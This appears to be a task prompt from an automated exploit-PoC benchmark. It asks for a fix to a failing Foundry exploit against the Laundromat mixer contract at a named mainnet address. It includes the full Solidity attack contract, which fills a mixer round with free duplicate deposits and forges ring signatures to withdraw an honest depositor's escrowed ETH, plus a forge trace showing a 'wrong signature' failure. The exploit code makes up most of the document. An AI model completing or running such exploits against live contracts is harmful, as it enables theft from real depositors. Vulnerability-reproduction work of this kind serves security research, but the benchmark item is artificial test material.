You are fixing a failing Foundry PoC for finding Laundromat-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero-cost Sybil deposits let an attacker complete a round and steal dormant mixer funds
- claim: The reproduced exploit succeeds after calling `deposit()` four times with identical parameters and no attached ETH, then immediately completing the `withdrawStart`/`withdrawStep`/`withdrawFinal` flow. This shows the mixer accepted zero-cost seat filling for a round that was supposed to require a fixed per-participant payment, and it also tolerated the attacker reusing the same deposit identity across multiple seats. An attacker can therefore occupy the remaining slots of any unfinished round for free and then redeem the pooled balance that an honest participant previously escrowed.
- impact: Any stale or partially filled mixer round can be hijacked permissionlessly: the attacker pays nothing to fill the missing seats, completes the withdrawal flow, and steals the honest depositor's ETH. In practice this drained the remaining balance of the historical Laundromat instance.
- exploit_paths: ["src/Laundromat.sol"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

address constant LAUNDROMAT = 0x934cbbE5377358e6712b5f041D90313d935C501C;
address constant SECP256K1_HELPER = 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6;

uint256 constant SECP_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
uint256 constant GX = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798;
uint256 constant GY = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8;

uint256 constant HONEST_X = 0x03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506;
uint256 constant HONEST_Y = 0x582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f;

interface ILaundromat {
    function deposit(uint256 commitment, uint256 proof) external payable;
    function withdrawStart(uint256[] calldata signature, uint256 x0, uint256 ix, uint256 iy) external;
    function withdrawStep() external;
    function withdrawFinal() external returns (bool);
}

error LaundromatStageFailed(uint8 stage, bytes revertData);
error LaundromatNoProfit();
error SecpCallFailed(bytes4 selector, bytes revertData);

contract FlawVerifier {
    uint256 private _realizedProfit;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startingBalance = address(this).balance;

        for (uint8 strategy = 0; strategy < 8; ++strategy) {
            _tryStrategy(strategy);
            if (address(this).balance > startingBalance) break;
        }

        uint256 endingBalance = address(this).balance;
        if (endingBalance <= startingBalance) revert LaundromatNoProfit();
        _realizedProfit = endingBalance - startingBalance;
    }

    function _tryStrategy(uint8 strategy) private {
        try new LaundromatAttackExecutor(payable(address(this)), strategy) {} catch {}
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _realizedProfit;
    }
}

contract LaundromatAttackExecutor {
    bytes4 private constant HASH_POINT_SELECTOR = 0x1bfa5d8a;
    bytes4 private constant MUL_SELECTOR = 0xd876fb21;
    bytes4 private constant ADD_SELECTOR = 0x5f8eb4c7;
    bytes4 private constant TO_AFFINE_SELECTOR = 0x58da3ca9;

    constructor(address payable beneficiary, uint8 strategy) payable {
        require(beneficiary != address(0), "bad beneficiary");

        (uint256 attackSecret, uint256 honestIndex, uint256 signerIndex) = _strategyConfig(strategy);
        _generatedAttempt(attackSecret, honestIndex, signerIndex);

        if (address(this).balance == 0) revert LaundromatNoProfit();
        selfdestruct(beneficiary);
    }

    receive() external payable {}

    function _strategyConfig(uint8 strategy)
        private
        pure
        returns (uint256 attackSecret, uint256 honestIndex, uint256 signerIndex)
    {
        if (strategy == 0) return (1, 4, 0);
        if (strategy == 1) return (1, 4, 1);
        if (strategy == 2) return (1, 4, 2);
        if (strategy == 3) return (1, 4, 3);
        if (strategy == 4) return (2, 4, 0);
        if (strategy == 5) return (2, 4, 1);
        if (strategy == 6) return (2, 4, 2);
        return (2, 4, 3);
    }

    function _generatedAttempt(uint256 attackSecret, uint256 honestIndex, uint256 signerIndex) private {
        require(attackSecret != 0 && attackSecret < SECP_N, "bad secret");
        require(honestIndex < 5, "bad honest index");
        require(signerIndex < 5 && signerIndex != honestIndex, "bad signer index");

        bytes memory attackPub = attackSecret == 1 ? _generator() : _toAffine(_mulAffine(_generator(), attackSecret));
        bytes memory honestPub = _affinePoint(HONEST_X, HONEST_Y);
        bytes memory attackHp = _hashPoint(attackPub);
        bytes memory honestHp = _hashPoint(honestPub);
        bytes memory keyImage = attackSecret == 1 ? attackHp : _toAffine(_mulAffine(attackHp, attackSecret));

        uint256 repeatedX = _word(attackPub, 0);
        uint256 repeatedY = _word(attackPub, 32);

        // Core exploit path stays unchanged:
        // 1) fill the four missing seats for free with the same deposit identity,
        // 2) start the withdrawal flow for the completed round,
        // 3) advance all withdraw steps,
        // 4) redeem the honest participant's escrowed ETH.
        // The only adaptation here is producing a valid address-bound LSAG transcript
        // for this freshly deployed executor, because replaying the historical signature
        // from a different caller address provably fails with "wrong signature".
        _deposit4(repeatedX, repeatedY);

        uint256 ix = _word(keyImage, 0);
        uint256 iy = _word(keyImage, 32);

        bytes[5] memory pubs;
        bytes[5] memory hps;
        for (uint256 i = 0; i < 5; ++i) {
            if (i == honestIndex) {
                pubs[i] = honestPub;
                hps[i] = honestHp;
            } else {
                pubs[i] = attackPub;
                hps[i] = attackHp;
            }
        }

        uint256[5] memory responses;
        uint256[5] memory challenges;
        uint256 alpha = _nonZeroMod(
            uint256(keccak256(abi.encodePacked("laundromat-alpha", address(this), attackSecret, honestIndex, signerIndex)))
        );

        for (uint256 i = 0; i < 5; ++i) {
            if (i == signerIndex) continue;
            responses[i] = _nonZeroMod(
                uint256(keccak256(abi.encodePacked("laundromat-s", address(this), attackSecret, honestIndex, signerIndex, i)))
            );
        }

        bytes memory signerL = _toAffine(_mulAffine(_generator(), alpha));
        bytes memory signerR = _toAffine(_mulAffine(hps[signerIndex], alpha));
        challenges[(signerIndex + 1) % 5] = _challenge(signerL, signerR);

        for (uint256 hop = 1; hop < 5; ++hop) {
            uint256 idx = (signerIndex + hop) % 5;
            uint256 nextIdx = (idx + 1) % 5;

            bytes memory left = _toAffine(_add(_mulAffine(_generator(), responses[idx]), _mulAffine(pubs[idx], challenges[idx])));
            bytes memory right = _toAffine(_add(_mulAffine(hps[idx], responses[idx]), _mulAffine(keyImage, challenges[idx])));
            challenges[nextIdx] = _challenge(left, right);
        }

        responses[signerIndex] = addmod(alpha, SECP_N - mulmod(challenges[signerIndex], attackSecret, SECP_N), SECP_N);
        if (responses[signerIndex] == 0) responses[signerIndex] = 1;

        uint256[] memory sig = new uint256[](5);
        for (uint256 i = 0; i < 5; ++i) {
            sig[i] = responses[i];
        }

        _checkedCall(2, abi.encodeWithSelector(ILaundromat.withdrawStart.selector, sig, challenges[0], ix, iy));
        _runWithdrawStepsAndFinalize();
    }

    function _deposit4(uint256 repeatedX, uint256 repeatedY) private {
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
    }

    function _runWithdrawStepsAndFinalize() private {
        uint256 startingBalance = address(this).balance;

        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));

        (bool ok, bytes memory ret) = LAUNDROMAT.call(abi.encodeWithSelector(ILaundromat.withdrawFinal.selector));
        if (!ok) revert LaundromatStageFailed(4, ret);

        bool finalized = ret.length == 0 || abi.decode(ret, (bool));
        if (!finalized && address(this).balance <= startingBalance) revert LaundromatNoProfit();
    }

    function _challenge(bytes memory left, bytes memory right) private view returns (uint256) {
        return _nonZeroMod(uint256(keccak256(abi.encodePacked(address(this), left, right))));
    }

    function _generator() private pure returns (bytes memory) {
        return _affinePoint(GX, GY);
    }

    function _affinePoint(uint256 x, uint256 y) private pure returns (bytes memory) {
        return abi.encodePacked(bytes32(x), bytes32(y));
    }

    function _hashPoint(bytes memory affine) private returns (bytes memory) {
        return _secpCall(HASH_POINT_SELECTOR, affine);
    }

    function _mulAffine(bytes memory affine, uint256 scalar) private returns (bytes memory) {
        return _secpCall(MUL_SELECTOR, abi.encodePacked(affine, bytes32(uint256(1)), bytes32(scalar)));
    }

    function _add(bytes memory a, bytes memory b) private returns (bytes memory) {
        return _secpCall(ADD_SELECTOR, abi.encodePacked(a, b));
    }

    function _toAffine(bytes memory point) private returns (bytes memory) {
        return _secpCall(TO_AFFINE_SELECTOR, point);
    }

    function _secpCall(bytes4 selector, bytes memory args) private returns (bytes memory out) {
        (bool ok, bytes memory ret) = SECP256K1_HELPER.call(abi.encodePacked(selector, args));
        if (!ok) revert SecpCallFailed(selector, ret);
        return ret;
    }

    function _checkedCall(uint8 stage, bytes memory data) private returns (bytes memory result) {
        (bool ok, bytes memory revertData) = LAUNDROMAT.call(data);
        if (!ok) revert LaundromatStageFailed(stage, revertData);
        return revertData;
    }

    function _word(bytes memory data, uint256 offset) private pure returns (uint256 value) {
        assembly {
            value := mload(add(add(data, 0x20), offset))
        }
    }

    function _nonZeroMod(uint256 value) private pure returns (uint256) {
        uint256 reduced = value % SECP_N;
        return reduced == 0 ? 1 : reduced;
    }
}

```

forge stdout (tail):
```
0cAcD6::58da3ca9(ae7ec27d410d6e7c85b30961b487d4a1ed1f7c259b67e0e8c4c45bbc12bdba81aed14002f3afa86b49e07fb50a5d1c1a242df97d1fe8728243abf341bd22898a0b8bc1b686647f83c1413fcc5dd1d569bab06c533b515a48e682a374f606dd1d)
    │   │   │   │   └─ ← [Return] 0xa1c0ff0e868fdeca0183078909a1656a2fb0728cf264e153ca3be96b5554209a7cd0095e3f3d6da2bd1afb04d720abdd170e24f40d8e4e0f0379dc728839d4b5
    │   │   │   ├─ [42144] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::1bfa5d8a(03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f)
    │   │   │   │   └─ ← [Return] 0x0bcfb901331ce97d5f8a4cecd753ee1a74e241a224ec7b7b44967d92d70af2560b773cdb66ba2c7cd48373e682766e73db420358f9fe2d02563ab75c637cffef
    │   │   │   ├─ [250814] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::d876fb21(0bcfb901331ce97d5f8a4cecd753ee1a74e241a224ec7b7b44967d92d70af2560b773cdb66ba2c7cd48373e682766e73db420358f9fe2d02563ab75c637cffef000000000000000000000000000000000000000000000000000000000000000152a90a74e90027547746b63440520bbaa5e68ba36572a7663dcb251742f551aa)
    │   │   │   │   └─ ← [Return] 0x0595af87c6e8d1f61dd48c0848a84e5080ca32d11f9f93c33355288fcb818a4f2d88ddc3b024d98af9fc1d3617db84165a3b389529e789d2aa06c6947103851b3aa47f2eecc99e9201b3089e26541da124bfd42af824e147ebca8de85d46cee5
    │   │   │   ├─ [259776] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::d876fb21(250c97b29c0eec7240f0f9cc24708e732c12a34b63af653f89081e0a18c51de8a8ca7df0b3822c10decafd1385054f9f074a4f9829919e91539605a3685a661300000000000000000000000000000000000000000000000000000000000000010993e61f2d251f743bb6ecb09bd3a0dab8d4c2bd9e75932738890d0f67cb814d)
    │   │   │   │   └─ ← [Return] 0x16673636c913aef7d1684a68b46ca09e35e63e3cc63c6d54a82ba9c3a4a176b810354c791eca04c3a91b911542a5d5d6ab92090b6c66259c4f84965309e391ec4b86e7ed195a25b18af89d20920159e4580c4b618bf06d735272efa21dceec7c
    │   │   │   ├─ [1278] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::5f8eb4c7(0595af87c6e8d1f61dd48c0848a84e5080ca32d11f9f93c33355288fcb818a4f2d88ddc3b024d98af9fc1d3617db84165a3b389529e789d2aa06c6947103851b3aa47f2eecc99e9201b3089e26541da124bfd42af824e147ebca8de85d46cee516673636c913aef7d1684a68b46ca09e35e63e3cc63c6d54a82ba9c3a4a176b810354c791eca04c3a91b911542a5d5d6ab92090b6c66259c4f84965309e391ec4b86e7ed195a25b18af89d20920159e4580c4b618bf06d735272efa21dceec7c)
    │   │   │   │   └─ ← [Return] 0x0e97078d29f19b24b5bd9f25e661f9d1266a325ad101eceee061a2be790766392b75001161ac5f501f193a5f9753bcc5d0045185e92599c3376f92f8c341dc89ca2653ca3e2868ac84e82301d2644b88074a22d310a741f30068e191f0b45431
    │   │   │   ├─ [83463] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::58da3ca9(0e97078d29f19b24b5bd9f25e661f9d1266a325ad101eceee061a2be790766392b75001161ac5f501f193a5f9753bcc5d0045185e92599c3376f92f8c341dc89ca2653ca3e2868ac84e82301d2644b88074a22d310a741f30068e191f0b45431)
    │   │   │   │   └─ ← [Return] 0x076d35aff49c490564e87d1ea438821b4e62bfd6a0f28bbacd0992db8bb2ee3b00d488891edd61180a51cf2b7f78949324f5f7ad08833310185caf0d75651c4f
    │   │   │   ├─ [30] PRECOMPILES::identity(0x000000000000000000000000c98d9175a32ca68c4b83db84b4707af82ae37cc4a1c0ff0e868fdeca0183078909a1656a2fb0728cf264e153ca3be96b5554209a7cd0095e3f3d6da2bd1afb04d720abdd170e24f40d8e4e0f0379dc728839d4b5076d35aff49c490564e87d1ea438821b4e62bfd6a0f28bbacd0992db8bb2ee3b00d488891edd61180a51cf2b7f78949324f5f7ad08833310185caf0d75651c4f)
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000c98d9175a32ca68c4b83db84b4707af82ae37cc4a1c0ff0e868fdeca0183078909a1656a2fb0728cf264e153ca3be96b5554209a7cd0095e3f3d6da2bd1afb04d720abdd170e24f40d8e4e0f0379dc728839d4b5076d35aff49c490564e87d1ea438821b4e62bfd6a0f28bbacd0992db8bb2ee3b00d488891edd61180a51cf2b7f78949324f5f7ad08833310185caf0d75651c4f
    │   │   │   ├─ [30] PRECOMPILES::identity(0x000000000000000000000000c98d9175a32ca68c4b83db84b4707af82ae37cc4a1c0ff0e868fdeca0183078909a1656a2fb0728cf264e153ca3be96b5554209a7cd0095e3f3d6da2bd1afb04d720abdd170e24f40d8e4e0f0379dc728839d4b5076d35aff49c490564e87d1ea438821b4e62bfd6a0f28bbacd0992db8bb2ee3b00d488891edd61180a51cf2b7f78949324f5f7ad08833310185caf0d75651c4f)
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000c98d9175a32ca68c4b83db84b4707af82ae37cc4a1c0ff0e868fdeca0183078909a1656a2fb0728cf264e153ca3be96b5554209a7cd0095e3f3d6da2bd1afb04d720abdd170e24f40d8e4e0f0379dc728839d4b5076d35aff49c490564e87d1ea438821b4e62bfd6a0f28bbacd0992db8bb2ee3b00d488891edd61180a51cf2b7f78949324f5f7ad08833310185caf0d75651c4f
    │   │   │   └─ ← [Stop]
    │   │   ├─ [3867] 0x934cbbE5377358e6712b5f041D90313d935C501C::withdrawFinal()
    │   │   │   ├─ [21] PRECOMPILES::identity(0x250c97b29c0eec7240f0f9cc24708e732c12a34b63af653f89081e0a18c51de8a8ca7df0b3822c10decafd1385054f9f074a4f9829919e91539605a3685a6613)
    │   │   │   │   └─ ← [Return] 0x250c97b29c0eec7240f0f9cc24708e732c12a34b63af653f89081e0a18c51de8a8ca7df0b3822c10decafd1385054f9f074a4f9829919e91539605a3685a6613
    │   │   │   ├─  emit topic 0: 0xd44da6836c8376d1693e8b9cacf1c39b9bed3599164ad6d8e60902515f83938e
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000f57726f6e67207369676e61747572650000000000000000000000000000000000
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Revert] 0x982c3486
    │   └─ ← [Revert] LaundromatNoProfit()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.09s (1.72s CPU time)

Ran 1 test suite in 3.15s (3.09s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 106182360)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
